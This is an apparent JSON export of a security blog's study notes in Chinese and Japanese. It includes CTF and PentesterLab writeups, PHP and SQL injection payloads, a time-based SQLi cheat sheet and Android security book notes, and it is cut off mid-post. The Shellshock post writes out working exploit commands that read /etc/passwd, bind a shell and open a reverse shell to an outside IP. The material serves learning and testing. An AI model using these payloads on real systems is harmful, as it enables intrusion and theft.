但是，这样的话安全性较差，因此NX(DEP)会使得text区域没有执行权限 RELRO 使用外部库(共享对象，*.so)时，他们会映射到地址空间的各个位置。 如果每次都计算这些库提供的函数地址，这不太方便，计算一次后保存到一个映射表会很方便后续使用。 这个表被称为GOT(Global Offset Table，全剧映射表)，它存在于地址固定的区域。 GOT实际上就在这里，但如果它是可写的，某些情况下如果它被重写，这个表也就变得不值得信任了。 因此，我们会使用一种叫做RELRO(Full-RELRO)的技术，在启动时计算所有外部库的所有函数地址，写入GOT中，然后使GOT只读。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记1:基本环境及概念","slug":"Pwn学习笔记1-基本环境及概念","date":"2019-02-21T04:36:20.000Z","updated":"2019-02-21T05:03:12.488Z","comments":true,"path":"2019/02/21/Pwn学习笔记1-基本环境及概念/","link":"","permalink":"https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E5%9F%BA%E6%9C%AC%E7%8E%AF%E5%A2%83%E5%8F%8A%E6%A6%82%E5%BF%B5/","excerpt":"","text":"0x01 工具 IDA Pro Linux x86 and x64 推荐Debian系列（Ubuntu,Debian,Kali,…） qemu gdb 自定义.gdbinit gdb-peda gdb script gdb -q -x cmd ./binary gdb-server C Python Perl Bash功能 /dev/tcp/&lt;IPADDR&gt;/&lt;PORT&gt; Binutils , Elfutils objdump,readelf,eu-readelf… nasm/ndisasm/radare2 netcat(nc) socat socat TCP-LISTEN:4444,reuseaddr,fork exec:./binary&amp; strace/ltrace strace –fiv ./binary checksec.sh checksec.sh --file ./binary rp++ rp-lin-x86 --file=binary --unique --rop=5 0x02 pwn问题类型 本地权限提升 remote shell 夺取 0x03 pwn问题的攻略方法基本战略： binary各项设定检查 checksec(NX,ASLR,RELRO,PIE) 分析binary，找到漏洞点 向漏洞点发送测试数据 控制binary运行流程 例如控制EIP getshell 打开shell的各种方法： 运行shellcode Exec-shell Exec-shell + back connect system(&quot;/bin/sh&quot;) や execve(&quot;/bin/sh&quot;,0,0) open(&quot;flag&quot;) -&gt; read() -&gt; write() 某些情况下不能直接获取shell，但能读取flag","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Postbook Writeup(Hacker101 CTF)","slug":"Postbook-Writeup-Hacker101-CTF","date":"2019-02-15T07:38:52.000Z","updated":"2019-02-15T07:40:30.908Z","comments":true,"path":"2019/02/15/Postbook-Writeup-Hacker101-CTF/","link":"","permalink":"https://darkwing.moe/2019/02/15/Postbook-Writeup-Hacker101-CTF/","excerpt":"","text":"flag1随意注册账号后登录，发现已经存在的文章，两篇文章id分别为1和3，手动修改查看2即可获取： flag2弱口令 user:password 登录成功后获得： flag3对文章id进行遍历，发现一个较大的id存在内容： flag4编辑文章，修改id为空： flag5删除文章使用加密id，使用前面获取的user账号获取属于user用户的文章id，之后登录自己注册的账号进行越权删除： flag6 对Cookie值进行查询发现只是数字id的md5，将其修改为1的md5后访问： flag7创建文章时修改userid为其他用户id，越权创建，获得flag：","categories":[{"name":"Hacker101 CTF","slug":"Hacker101-CTF","permalink":"https://darkwing.moe/categories/Hacker101-CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"$_SERVER['SCRIPT_NAME']変数のインシェクション","slug":"$_SERVER['SCRIPT_NAME']変数のインシェクション","date":"2019-02-13T05:50:45.000Z","updated":"2019-02-13T05:53:28.177Z","comments":true,"path":"2019/02/13/$_SERVER['SCRIPT_NAME']変数のインシェクション/","link":"","permalink":"https://darkwing.moe/2019/02/13/$_SERVER['SCRIPT_NAME']%E5%A4%89%E6%95%B0%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B7%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3/","excerpt":"","text":"0x00 概要$_SERVER[‘SCRIPT_NAME’]はPHP用の１つ組み込み変数です。ここでは、使用時には、一般的にフィルタリングされません。 fuzzの後、この変数の取得は実際に問題がある、予期しないデータが導入されます。 一部のWebサーバーでは、この変数を直接使用すると、SQLインジェクションまたはxssの脆弱性が発生する可能性があります。 0x01 テストApache/2.4.23に $_SERVER[&#39;SCRIPT_NAME&#39;]変数があります。 私のローカルテスト環境は、Apache/2.4.23（Win32）OpenSSL/1.0.2j PHP/5.5.38 MySQL/5.5.53です。 現在Apache/2.4.23でのみ成功しています。 $_SERVER[&#39;SCRIPT_NAME&#39;]変数の公式ドキュメントは次のとおりです: img 簡単に言えば、この変数は、Webサービスのルートディレクトリから現在のファイルへのパスを返します。Webルートディレクトリが/var/www/htmlで、現在のファイルパスが/var/www/html/t/index.phpであると仮定すると、index.phpで取得された$_SERVER[&#39;SCRIPT_NAME&#39;]は/t/index.php。 上記は正常なプロセスです。 しかし、PHPにはパラメータを渡る方法が2種類があります。 1つは、index.php?id =1のような、キーと値のペアの伝統的な形式です。 もう一つのルートで、パラメータを渡すことです：/index.php/xx/b/c。$_SERVER[&#39;SCRIPT_NAME&#39;]変数は、ルートでパラメータを渡すことにさらに有害です。 ルートでパラメータを渡すのURLでは、URLの最後に /*を追加することができます。つまり、ファイル名の後にスペース + /*を追加して、ファイル名を破棄して、ファイル名の後にデータを取得できます。 img img テストでは、&#39;（一重引用符）&quot;（二重引用符）、;（セミコロン）&lt;&gt;（角カッコ）()（カッコ）などのペイロードで一般的に使用される記号はフィルタリングされません。 一般的なCMSでは、一般にGET、POST、COOKIEの3つの変数のみがフィルタリングされます.GPCのグローバルエスケープが有効になっていても、$_SERVER変数はエスケープされません。 特別な注意が必要なのは、ペイロードに?（疑問符）は表示されません、疑問符が切り捨てられ、ファイル名の後にデータを取得できなくなります。 0x02 使用方法私はかつてこのCMSに遭遇し、$_SERVER[&#39;SCRIPT_NAME&#39;]をページに直接書きました。 このようにして、反射的なxss攻撃を実行できます。 さらに、CMSはヘッダを保護せずにphpファイルとして直接ページをキャッシュします。 言い換えれば、私たちが書くPHP文もキャッシュファイルにキャッシュされます。 WebShellを直接生成します。 コード監査中に$_SERVER[&#39;SCRIPT_NAME&#39;]変数を追跡して、変数の値がデータベースに渡されるか、ページに直接渡されるかどうかを調べることができます。 0x03 ケーススタディ - XSSindex.phpコードは次のとおりです: ` exp: http://localhost/index.php/&lt;img src=x onerror=alert(1)&gt; /\\* img 0x04 ケーススタディ - SQLインジェクションindex.phpコードは次のとおりです: 123456789101112131415&lt;?phperror_reporting(0);$db&#x3D;&quot;xx&quot;;$dbuser&#x3D;&quot;xxxxx&quot;;$dbpwd&#x3D;&quot;xxxx&quot;;$host&#x3D;&quot;localhost&quot;;$mysql&#x3D;mysqli_connect($host,$dbuser,$dbpwd,$db) or die(&quot;connect failed&quot;);$sql&#x3D;&quot;select password from user where username&#x3D;&#39;&quot;.$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#39;&quot;;$result&#x3D;mysqli_query($mysql,$sql) or print_r(mysqli_error($mysql));$result_array&#x3D;mysqli_fetch_all($result);echo &quot;Your password is:&quot;.$result_array[0][0]; exp: 1http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))||&#39; &#x2F;* img","categories":[{"name":"梧桐百科","slug":"梧桐百科","permalink":"https://darkwing.moe/categories/%E6%A2%A7%E6%A1%90%E7%99%BE%E7%A7%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://darkwing.moe/tags/PHP/"}]},{"title":"glob://を使用して、open_basedirをバイパスする","slug":"glob-を使用して、open-basedirをバイパスする","date":"2019-02-11T05:34:15.000Z","updated":"2019-02-11T05:35:36.777Z","comments":true,"path":"2019/02/11/glob-を使用して、open-basedirをバイパスする/","link":"","permalink":"https://darkwing.moe/2019/02/11/glob-%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%A6%E3%80%81open-basedir%E3%82%92%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9%E3%81%99%E3%82%8B/","excerpt":"","text":"0x00 open_basedir open_basedirは、指定されたディレクトリへのユーザアクセスを制限します。 つまり、ユーザーはサーバー上の指定されたディレクトリ以外のファイルにアクセスできません。 クロスサイトを防ぐためによく使用されます。 open_basedir=/home/wwwroot/home/web1/:/tmp/とすると、web1経由でサーバにアクセスするユーザは、サーバ上で/home/wwwroot/home/web1/および/tmp/以外のファイルを取得することはできません。もちろん、物事は絶対的なものではありません。 open_basedirの設定は、systemなどのコマンド実行関数では無効です。 一般に、コマンド実行を引き起こしやすいsystemやその他の関数は、disable_functionに置かれます。 したがって、通常の状況下では、open_basedir の設定はクロスサイトでは依然として非常に役に立ちます。 しかし、ハッカーの精神は何ですか？ ハッカーの精神は、不可能なものすべてに挑戦することです。 一連のコマンド実行機能が無効になっていても、open_basedirが設定されていても、スマートハッカーは目に見えない攻撃ポイントを使用して攻撃を実行します。open_basedirをバイパスするの最も一般的な使い方はsymlink()関数を使うことです。 具体的な使用については、私が知っている以上phith0nのブログでは言ったことが参照できます: https://www.leavesongs.com/bypass-open-basedir-readfile.html このため、disable_functionにsymlink()を追加する必要があります。 これは刑務所を構成し、Webshellを取得したハッカーは、制限されたフォルダに閉じ込められます。 0x01 glob://疑似プロトコル glob://疑似プロトコルの公式文書は以下の通りです: glob://によって、私たちのフィルタ基準を満たしのディレクトリを得ることができます。 問題はここで、glob://を使用してディレクトリをフィルタリングすることは、open_basedirによって制限されていません。glob://マッチングによって、open_basedirをバイパスする,指定されたディレクトリ以外のディレクトリにアクセスできます。 実際、PHPのglob()も同様の問題を抱えていました。 しかし、すぐに修正されました。 しかし、glob://の問題は今日まで続く。 0x02 コード例 私はここでドッカーを使用しています、環境は:nginx / 1.12.2 + PHP 7.1.7（cli）。 バイパス効果をよりよく知るために、disable_functionからscandir()を取り出しました。 次にコードを書く： 1&#x2F;&#x2F;index.php error_reporting(E_ALL); ini_set(&#39;open_basedir&#39;, &#39;&#x2F;home&#x2F;wwwroot&#x2F;default&#x2F;&#39;); eval($_GET[&#39;a&#39;]); glob://を使わずにディレクトリを列挙しようとします。 img open_basedirで許可されている範囲内のディレクトリを自由にリストすることは自明です。 ただし、指定されたファイルの範囲を超えた場合、open_basedir restriction in effecの警告を取得する、ディレクトリの列挙は実装できません。 次に、glob://疑似プロトコルを使用してその効果を確認します。 ご覧のとおり、glob://疑似プロトコルを使用した後で、/home/ディレクトリ下のサブディレクトリを取得できました。","categories":[{"name":"梧桐百科","slug":"梧桐百科","permalink":"https://darkwing.moe/categories/%E6%A2%A7%E6%A1%90%E7%99%BE%E7%A7%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://darkwing.moe/tags/PHP/"}]},{"title":"CTF問題を例として,parse_url関数をバイパスすることを学ぶ","slug":"CTF問題を例として-parse-url関数をバイパスすることを学ぶ","date":"2019-02-02T05:31:49.000Z","updated":"2019-02-02T05:32:53.160Z","comments":true,"path":"2019/02/02/CTF問題を例として-parse-url関数をバイパスすることを学ぶ/","link":"","permalink":"https://darkwing.moe/2019/02/02/CTF%E5%95%8F%E9%A1%8C%E3%82%92%E4%BE%8B%E3%81%A8%E3%81%97%E3%81%A6-parse-url%E9%96%A2%E6%95%B0%E3%82%92%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9%E3%81%99%E3%82%8B%E3%81%93%E3%81%A8%E3%82%92%E5%AD%A6%E3%81%B6/","excerpt":"","text":"問題 運用保守担当者の間違いのため、イントラネット認証ページは外部ネットワークに展開されましたが、幸いにも、開発者はドメイン名の検証が行われました。 Writeup ソースコードを表示し、次のコードを見つけます: 123456789101112ini_set(&quot;display_errors&quot;,0); $uri &#x3D; $_SERVER[&#39;REQUEST_URI&#39;];if(stripos($uri,&quot;.&quot;))&#123; die(&quot;Unkonw URI.&quot;); &#125; if(!parse_url($uri,PHP_URL_HOST))&#123; $uri &#x3D; &quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;].$_SERVER[&#39;REQUEST_URI&#39;]; &#125; $host &#x3D; parse_url($uri,PHP_URL_HOST);if($host &#x3D;&#x3D;&#x3D; &quot;c7f.zhuque.com&quot;)&#123; setcookie(&quot;AuthFlag&quot;,&quot;flag&#123;*******&quot;); &#125; 明らかに、parse_url関数をバイパスすることを検査です. しかし、最初にドットのマッチングが増え、バイパスすることができます。 ペイロードを使用する：.@c7f.zhuque.com/..// 以上です。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://darkwing.moe/tags/PHP/"}]},{"title":"高負荷のSQL文を使用したTime-based SQLインシェクション","slug":"高負荷のSQL文を使用したTime-based-SQLインシェクション","date":"2019-02-01T01:59:06.000Z","updated":"2019-02-01T02:01:14.248Z","comments":true,"path":"2019/02/01/高負荷のSQL文を使用したTime-based-SQLインシェクション/","link":"","permalink":"https://darkwing.moe/2019/02/01/%E9%AB%98%E8%B2%A0%E8%8D%B7%E3%81%AESQL%E6%96%87%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%9FTime-based-SQL%E3%82%A4%E3%83%B3%E3%82%B7%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3/","excerpt":"","text":"0x00 概要 sleep、benchmark関数を使用できない場合,より多くの計算量を伴うクエリは,データベースのクエリ時間を長くし、遅延注入の効果を達成する。たとえば、mssqlはこのようなものを使うことができます： 1AND 2333&#x3D;(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) 0x01 なぜ高負荷のSQL文を必要としますか？ 時間遅延を引き起こすいくつかの関数が注入で使用できない場合、たとえば、次の関数がフィルタリングされます： sleep benchmark Get_lock おそらくもっと データベースのクエリ時間を可能な限り長くするために、遅延注入のために重いクエリを使用することができます。たとえば、information_schemaの2つの大きなテーブルにデカルト積とその他のステートメントを実行させます。注意：benchmarkを使用した注入は、基本的には重いクエリの範囲内ですが、ここでは説明しません。 0x02 cheatsheet PostgreSQL AND 2333=(SELECT COUNT(*) FROM GENERATE_SERIES(1,1000000000)) MSSQL AND 2333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) Oracle AND 2333=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) IBM DB2 AND 2333=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) SQLite AND 23333=LIKE(‘ABCDEFG’,UPPER(HEX(RANDOMBLOB(100000000/2)))) Mysql AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C); より多くのpayload： https://github.com/sqlmapproject/sqlmap/blob/HEAD/xml/payloads/time_blind.xml 0x03 参照 https://www.anquanke.com/post/id/104319 （中国語、その後日本語に翻訳する）","categories":[{"name":"梧桐百科","slug":"梧桐百科","permalink":"https://darkwing.moe/categories/%E6%A2%A7%E6%A1%90%E7%99%BE%E7%A7%91/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://darkwing.moe/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"Android恶意代码分析与渗透测试","slug":"Android恶意代码分析与渗透测试","date":"2019-01-31T04:58:41.000Z","updated":"2019-01-31T05:03:07.051Z","comments":true,"path":"2019/01/31/Android恶意代码分析与渗透测试/","link":"","permalink":"https://darkwing.moe/2019/01/31/Android%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"1. Android的基本概念1.1 Android的架构 Linux内核 库 Android运行时 应用程序与框架 设备文件目录结构 1.2 Android重要组件 Activity Service Content Provider 1.3 Android应用程序的基本结构 Androidmanifest.xml classes.dex 2.Android应用程序诊断环境2.1 构建Android环境 Android SDK ADK Android Studio 测试机或虚拟机 2.2 构建数据包分析及检测环境 路由器 Cain&amp;Able Wireshark / Tshark tcpdump 2.3 切换设备平台 Rooting Tegrak内核 CF-Auto-Root 2.4 Android诊断工具介绍 ADB adb pull / push logcat pm(package manager) Busybox 2.5 使用编辑器分析文件格式 010Editor dex模板 3. Android APP分析方法3.1 通过反编译进行静态分析 dex2jar jd-gui AstroGrep jad 3.2 通过动态调试进行分析 apktool smali signapk 3.3 通过代码修补绕过apk文件 strings.xml 3.4 使用AndroGuard进行分析 Androapkinfo Androxml Androluze Androdd Androdiff / Androsim 3.5 使用DroidBox进行自动分析3.6 使用Sublim插件进行分析 AndroGuard 3.7 使用APKInspector进行分析3.8 使用dexplorer和dexdump进行分析3.9 使用Santoku分析移动APP4.恶意代码分析4.1 使用在线分析服务 Anubis VirusTotal VirusTotal APP andrototal apkscan app Dexter APK Analyzer4.2 手动分析恶意代码APP4.3 用户应对恶意代码威胁的方法 5.Android移动服务诊断5.1 构建虚拟漏洞诊断测试环境 AndroidLab 5.2 OWASP TOP 10 移动安全威胁5.3 保存不安全的数据 /mnt/sdcard /data/data/package_name 应对方案： Private 5.4 易受攻击的服务器端控制5.5 使用易受攻击的密码5.6 传输层保护不足（非加密通信） AppUse 5.7 源代码信息泄露 Proguard Dexguard AndroidEnv 5.8 泄露重要信息 泄露内存中的重要信息 5.9 泄露日志信息 LogCat 5.10 Web服务漏洞项目诊断5.11 App应对方案： 加密源代码 Proguard6. 使用Android诊断工具6.1 PacketShark： 网络数据包截获工具6.2 Drozer： 移动诊断框架6.3 ASEF： 移动设备漏洞工具6.4 DroidSheep： Web会话截取工具6.5 dSploit： 网络诊断工具","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://darkwing.moe/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://darkwing.moe/tags/Android/"},{"name":"移动安全","slug":"移动安全","permalink":"https://darkwing.moe/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"}]},{"title":"Android安全攻防实战","slug":"Android安全攻防实战","date":"2019-01-31T04:28:23.000Z","updated":"2019-01-31T04:31:41.923Z","comments":true,"path":"2019/01/31/Android安全攻防实战/","link":"","permalink":"https://darkwing.moe/2019/01/31/Android%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/","excerpt":"","text":"1. Android开发工具配置环境，开发工具，测试机或者虚拟机，adb 2. 实践app安全2.2 检查app的证书和签名解压apk文件 12345678输出证书内容keytool -printcert -file META-INF&#x2F;CERT.RSA查看签名文件内容cat META-INF&#x2F;CERT.SF查看证书openssl pkcs7 -inform DER -in META-INF&#x2F;CERT.RSA -noout -print_certs -text 2.3 对Android app签名12345生成keystorekeytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore对APK重新签名jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore demo.keystore -signedjar demo_signed.apk 2.4 验证app的签名12验证APK签名jarsigner -verify -verbose demo_signed.apk Androidmanifest.xml文件 adb与Activity交互（也可使用drozer） adb pull和push，文件管理 3. Android安全评估工具集成环境：Santoku（基于Ubuntu，集成部分移动安全工具） drozer 123456789101112启动drozer agentadb forward tcp:31415 tcp:31415drozer console connectrun app.package.listrun app.package.list -f app名run app.package.info -a 包名run app.activity.info -a 包名run app.provider.info -a 包名run app.service.info -a 包名run app.broadcast.info -a 包名run app.package.attacksurface 包名run app.activity.start --action *** --category *** --component *** 编写drozer模块 4. 利用app中的漏洞 logcat 网络流量：tcpdump 使用drozer攻击导出的组件 对app做中间人攻击（Burpsuite或其他MITM工具 5.保护app 组件，不必要导出 定制权限 content provider路径 防御sql注入 验证app的签名（防篡改） 反逆向工程（检测安装程序，模拟器，调试标志位） Proguard删除日志和/或进行混淆 DexGuard进行高级混淆 6.逆向app12345678910111213141516171819202122232425java To dexjavac -source 1.6 -target 1.6 Example.java#dx路径：D:\\AndroidSDK\\build-tools\\22.0.1\\lib\\dx.jardx --dex --output&#x3D;Example.dex Example.classdex文件格式dex文件解析：#dexdump路径：D:\\AndroidSDK\\build-tools\\22.0.1\\dexdumpdexdump Example.dexdx --dex --verbose-dump --dump-to&#x3D;outfile.txt Example.classdex To smalibaksmali.jar Example.dex -o outsmali To dexsmali.jar out -o out.dexdex2javadex2jar Example.dexjd-guiNDK so库objdump -D ×××.sogdbserver+gdb 7.网络安全 验证SSL自签名证书（注意不要使用网络上的错误代码） 使用onionkit库中的StrongTrustmanager SSL pinning–限定受信SSL的范围 8.原生代码中漏洞的利用和分析 溢出及root漏洞，略 自动fuzzing测试Android原生代码： Radamsafuzzer busybox 9.加密与在开发时使用设备管理策略 使用加密库 生成对称加密密钥 保护SharedPreferences数据 基于口令的加密 用SQLCipher加密数据库 Android Keystore provicer 在开发时使用设备管理策略","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://darkwing.moe/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://darkwing.moe/tags/Android/"},{"name":"移动安全","slug":"移动安全","permalink":"https://darkwing.moe/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-01-31T03:00:00.000Z","updated":"2019-01-31T03:04:41.164Z","comments":true,"path":"2019/01/31/hello-world/","link":"","permalink":"https://darkwing.moe/2019/01/31/hello-world/","excerpt":"","text":"新域名，之后在这边更新吧 Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"CVE-2014-6271/Shellshock","slug":"CVE-2014-6271-Shellshock","date":"2015-09-13T02:12:02.000Z","updated":"2019-09-24T02:13:16.281Z","comments":true,"path":"2015/09/13/CVE-2014-6271-Shellshock/","link":"","permalink":"https://darkwing.moe/2015/09/13/CVE-2014-6271-Shellshock/","excerpt":"","text":"简介主要介绍了CVE-2014-6271漏洞的利用。这个漏洞影响Bourne Again Shell “Bash”。Bash通常无法通过web应用程序访问，但可以通过公共网关接口（Common Gateway Interface “CGI”）间接接触。 指纹识别通过代理（Burp Suite 或者 OWASP Zap）访问web应用程序，我们可以发现当页面被加载时访问了多个URL： 要利用“Shellshock”，我们需要找到一种方式来和Bash进行“交谈”。这意味着找到一个CGI来使用Bash。CGI通常使用Python或者Perl，但在老旧的服务器上用Shell或者C写的CGI也很常见。 CGI如何工作当你调用一个CGI，web服务器（这里是Apache）将开始一个新的进程并运行CGI。这里它会启动一个Bash进程并且运行CGI脚本。Apache需要向CGI脚本传递信息。它使用环境变量来做到这些。环境变量在CGI脚本中是有效使用的。它允许Apache很容易的向CGI传递每一个头信息（或者其他信息）。如果你的HTTP请求头中有一个名叫Blah的头，那么在CGI脚本中你将有一个名为HTTP_BLAH的环境变量。 漏洞在这里，我们主要关注Bash相关漏洞的第一个版本，但还有很多：CVE-2014-6277, CVE-2014-6278, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187…问题的根源在于Bash可以声明环境变量是一个内部函数。该漏洞的第一个版本与与函数声明导致任意命令执行有关。首先，我们需要声明环境变量是一个函数，通过使用()。然后，我们将添加一个空的函数体。最后，我们可以在函数声明后添加我们想要运行的命令。更多的细节可以在这份邮件中找到（ following email on oss-sec）。如果你还记得我们之前所说的，Apache使用环境变量将头信息传递给CGI。因为它是基于CGI的Bash，我们可以声明一个空函数，然后在声明之后添加任意命令。 利用该漏洞可以通过代理的repeater模块或者netcat进行利用。有很多攻击在载荷可用，这取决于你想要达到什么效果。你可以使用下面的载荷来读取任意文件： 1$ echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; echo \\$(&lt;/etc/passwd)\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | nc vulnerable 80 这个有效载荷将读取文件 /etc/passwd 并将内容显示在响应中。你需要查看HTTP响应头来查看文件内容。 绑定Shell如果你想运行命令，最简单的方法是绑定一个Shell。你可以使用netcat（或者nc）监听一个端口并且重定向输入输出到 /bin/sh 。 1$ echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | nc vulnerable 80 在这里。已经给出了netcat/nc的路径。在真实系统中，你将不得不暴力枚举路径，甚至它有可能根本没安装。如果连接生效，CGI将等待你进行连接。然后，你可以连接到绑定端口： 123$ nc vulnerable 9999iduid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab) 绑定Shell有着很大的限制：在你和受害者之间可能有防火墙，这将导致端口只是绑定，但你无法连接。为了绕过这一点，我们需要让服务器主动连接我们。 反弹Shell我们希望服务器连接到我们，。要做到这种效果，我们需要首先在本地监听一个端口。我们需要使用一个服务器可以访问的端口，最常见的是21（FTP）、53（DNS）、123（NTP）、80（HTTP）和443（HTTPS），这些端口是服务器用来保持系统更新和进行每天的工作的端口。我们将绑定443端口（你需要root用户或者sudo权限），使用下面的命令： 1# nc -l -p 443 现在，我们只需要调整攻击载荷，以使得服务器连接回我们的443端口： 1echo \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | nc vulnerable 80 然后返回到最初的netcat，我们可以在本地输入命令，它们将在服务器系统上运行： 123# nc -l -p 443iduid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab) 总结这个练习将教你如何手动检测和利用Shellshock获得命令的执行。这种安全漏洞是非常有趣的，往往可以在很长一段时间内不被发现，因为它位于内部的组件之间的相互作用。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pentesterlab","slug":"Pentesterlab","permalink":"https://darkwing.moe/tags/Pentesterlab/"}]},{"title":"From SQL Injection to Shell: PostgreSQL edition","slug":"From-SQL-Injection-to-Shell-PostgreSQL-edition","date":"2015-04-09T05:18:44.000Z","updated":"2019-09-19T05:21:12.442Z","comments":true,"path":"2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/","link":"","permalink":"https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/","excerpt":"","text":"SQL注入检测检测方法已经在“From SQL Injection to Shell”中详细描述过。唯一的区别是错误信息： 1Warning: pg_exec(): Query failed: ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: SELECT * FROM pictures where cat&#x3D;2&#39; ^ in &#x2F;var&#x2F;www&#x2F;classes&#x2F;picture.php on line 17 ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: SELECT * FROM pictures where cat&#x3D;2&#39; ^ SQL注入并不是一门精确的科学，很多东西都会影响到你的测试结果。如果你遇到这些，继续测试注入，尝试测试出后台代码来确认它是一个SQL注入。 为了找到SQL注入，你需要访问网站并且使用这些方法测试每一个页面的每一个参数。一旦你发现了SQL注入，你可以到下一节去学习如何利用它。 SQL注入利用现在我们在页面http://vulnerable/cat.php发现了一个SQL注入，为了更进一步，我们需要利用它来检索信息。为此，我们需要了解SQL中使用的 UNION 关键字。 在PostgreSQL中使用UNION进行SQL注入类似于MySQL，使用UNION利用SQL注入遵循下面的步骤： 找出列数用来执行UNION 找出哪些列被显示在页面上 从元表数据库中检索信息 从其他表或数据库中检索信息 为了执行SQL注入的请求，你需要找到所查询的第一部分返回的列数。你需要猜这个数，除非你有应用程序的源代码。 有两种方法得到这个信息： 使用 UNION SELECT 和增加列数； 使用 ORDER BY 语句。 如果你尝试 UNION 并且两个查询返回的列数是不同的，数据库将抛出一个错误： 1Warning: pg_exec(): Query failed: ERROR: each UNION query must have the same number of columns 可以使用这个属性来猜列数。例如，如果你可以注入以下语句： SELECT id,name,price FROM articles where id=1 ，你可以采用以下步骤： SELECT id,name,price FROM articles where id=1 UNION SELECT 1 ,注入内容 1 UNION SELECT 1 将返回一个错误因为查询语句的两个子部分的列数是不同的； SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2 ，因为如上同样的原因，注入内容 1 UNION SELECT 1,2 会返回一个错误； SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3 ，因为两个子部分拥有相同的列数，这个语句将抛出一个不同的错误信息。 如下： 1Warning: pg_exec(): Query failed: ERROR: UNION types character varying and integer cannot be matched 另一种方法是利用关键字 ORDER BY 。类似于“From SQL Injection to Shell”中的使用方式。唯一的区别是由应用程序返回的错误消息： 1Warning: pg_exec(): Query failed: ERROR: ORDER BY position 10 is not in select list 检索信息现在我们已经知道了列数，我们可以从数据库中检索信息。基于我们收到的错误信息，我们知道后台使用的数据库是 